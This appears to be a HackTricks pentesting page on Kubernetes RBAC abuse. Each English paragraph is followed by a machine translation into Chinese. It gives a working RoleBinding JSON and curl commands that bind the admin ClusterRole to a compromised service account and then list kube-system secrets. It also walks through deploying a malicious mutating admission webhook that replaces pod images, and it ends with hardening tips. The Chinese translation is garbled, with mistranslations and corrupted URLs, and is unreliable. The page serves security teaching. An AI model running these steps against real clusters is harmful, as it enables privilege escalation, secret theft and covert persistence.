The following ClusterRole is using the special verb _bind_ that allows a user to create a RoleBinding with _admin_ ClusterRole (default high privileged role) and to add any user, including itself, to this admin ClusterRole.

以下clusterrole是使用特殊动词_bind_，该_bind_允许用户使用_admin_ clusterrole（默认的高特权角色）创建角色限制，并将包括本身在内的任何用户添加到此admin clusterrole。

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

！

Then it's possible to create **`malicious-RoleBinging.json`**, which **binds the admin role to other compromised service account:**

然后可以创建**``恶意 - 刺激。

```javascript
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespaces": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "compromised-svc"
            "namespace": "default"
        }
    ]
}
```

The purpose of this JSON file is to bind the admin “CluserRole” (line 11) to the compromised service account (line 16).

该JSON文件的目的是将管理员“ cluserrole”（第11行）绑定到受损的服务帐户（第16行）。

Now, all we need to do is to send our JSON as a POST request to the API using the following CURL command:

现在，我们要做的就是使用以下curl命令将我们的JSON作为POST请求发送到API：

```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \ 
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
 -d @malicious-RoleBinging.json
```

After the **admin role is bound to the “compromised-svc” service account**, we can use the compromised service account token to **list secrets**. The following CURL command will do this:

**管理员角色被绑定到“妥协的SVC”服务帐户**之后，我们可以将折衷的服务帐户令牌使用到**列表秘密**。 以下卷曲命令将执行此操作：

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

## Other Attacks

##其他攻击

### S**idecar proxy app**

By default there isn't any encryption in the communication between pods .Mutual authentication, two-way, pod to pod.

默认情况下，Pods之间的通信中没有任何加密。Mutual认证，双向，POD到POD。

#### Create a sidecar proxy app <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

#### Create a sidecar proxy app <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Create your .yaml

创建您的.yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Edit your .yaml and add the uncomment lines:

编辑您的.YAML并添加未点击行：

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
    command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
    securityContext:
      capabilities:
        add: ["NET_ADMIN"]
 #   volumeMounts:
 #   - name: sec-ctx-vol
 #     mountPath: /data/demo
 #   securityContext:
 #     allowPrivilegeEscalation: true
```

See the logs of the proxy:

请参阅代理的日志：

```bash
kubectl logs app -C proxy
```

More info at: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

更多信息，网址：[https://kubernetes.io/docs/tasks/configure-pod-container/security-container/security-context/]（ /）

### Malicious Admission Controller

###恶意入学控制器

An admission controller is a piece of code that **intercepts requests to the Kubernetes API server** before the persistence of the object, but **after the request is authenticated** **and authorized**.

入学控制器是**在对象持续存在之前，**拦截对Kubernetes API服务器的请求**，但是**在请求后**进行身份验证** **并授权**。

![](<../../../.gitbook/assets/image (651) (1) (1) (1) (1) (1).png>)

If an attacker somehow manages to **inject a Mutationg Adminssion Controller**, he will be able to **modify already authenticated requests**. Being able to potentially privesc, and more usually persist in the cluster.

如果攻击者以某种方式设法**注入突变gyminssion控制器**，他将能够**修改已验证的请求**。 能够潜在地提高群集，并且通常会持续存在。

Example from [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

示例来自[https://blog.rewanthtammana.com/creating-malicious-abismiss-controllers]（

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Wait until the webhook server is ready. Check the status:

等到Webhook服务器准备就绪。 检查状态：

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

！[mutating-webhook-status-check.png]（https://cdn.hashnode.com/res/res/hashnode/image/upload/v16284343434343434343353/yhuvuwwugr.png?auto=compress.porress.format = wewewewewewewugr.p.

Once we have our malicious mutating webhook running, let's deploy a new pod.

一旦我们进行了恶意变异的Webhook运行，让我们部署一个新的POD。

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Wait again, until you see the change in pod status. Now, you can see `ErrImagePull` error. Check the image name with either of the queries.

再次等待，直到您看到POD状态的变化。 现在，您可以看到“ ermimagepull”错误。 使用任何一个查询检查图像名称。

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

！[MALICIT-IDMISSION-CONTROLLER.PNG]（https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/lefxtgszm.png?auto = compressempressempressempressempressempressempressemtat \ format = webp）

As you can see in the above image, we tried running image `nginx` but the final executed image is `rewanthtammana/malicious-image`. What just happened!!?

如您在上面的图像中所见，我们尝试运行图像`nginx'，但最终执行的图像是`rewanthtammana/alialicimage“。 刚才发生了什么！！？

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

####技术性<a href="#heading-technicalities" id="heading-technicalities"> </a>

We will unfold what just happened. The `./deploy.sh` script that you executed, created a mutating webhook admission controller. The below lines in the mutating webhook admission controller are responsible for the above results.

我们将展开刚刚发生的事情。 您执行的`。/decloy.sh`脚本，创建了一个突变的webhook录取控制器。 突变Webhook接收器控制器中的以下线路负责上述结果。

```
patches = append(patches, patchOperation{
    Op:    "replace",
    Path:  "/spec/containers/0/image",
    Value: "rewanthtammana/malicious-image",
})
```

The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

上面的摘要用“ rewanthtammana/alistimimage”代替了每个吊舱中的第一个容器图像。

## Best Practices

### **Prevent service account token automounting on pods**

### **防止服务帐户令牌上的自动填充吊舱**

When a pod is being created, it automatically mounts a service account (the default is default service account in the same namespace). Not every pod needs the ability to utilize the API from within itself.

当创建POD时，它会自动安装服务帐户（默认为同一命名空间中的默认服务帐户）。 并非每个POD都需要从自身内部使用API的能力。

From version 1.6+ it is possible to prevent automounting of service account tokens on pods using automountServiceAccountToken: false. It can be used on service accounts or pods.

从1.6+版本中，可以防止使用AutomountServiceAccountToken：false在PODS上自动化服务帐户令牌。 它可以在服务帐户或豆荚上使用。

On a service account it should be added like this:\\

在服务帐户上应该添加这样的添加：\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

！

It is also possible to use it on the pod:\\

也可以在吊舱上使用它：\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

！

### **Grant specific users to RoleBindings\ClusterRoleBindings**

### **将特定用户授予角色符号\ clusterrolebindings **

When creating RoleBindings\ClusterRoleBindings, make sure that only the users that need the role in the binding are inside. It is easy to forget users that are not relevant anymore inside such groups.

在创建角色符号\ clusterrolebindings时，请确保只有在绑定中需要角色的用户才能内部。 很容易忘记此类组中不再相关的用户。

### **Use Roles and RoleBindings instead of ClusterRoles and ClusterRoleBindings**

### **使用角色和角色饰面代替簇和簇 - 连接**

When using ClusterRoles and ClusterRoleBindings, it applies on the whole cluster. A user in such a group has its permissions over all the namespaces, which is sometimes unnecessary. Roles and RoleBindings can be applied on a specific namespace and provide another layer of security.

当使用簇和簇链接时，它适用于整个群集。 此类组中的用户在所有名称空间上都具有其权限，这有时是不必要的。 角色和角色符号可以应用于特定的名称空间，并提供另一层安全性。

### **Use automated tools**

### **使用自动工具**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **References**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>
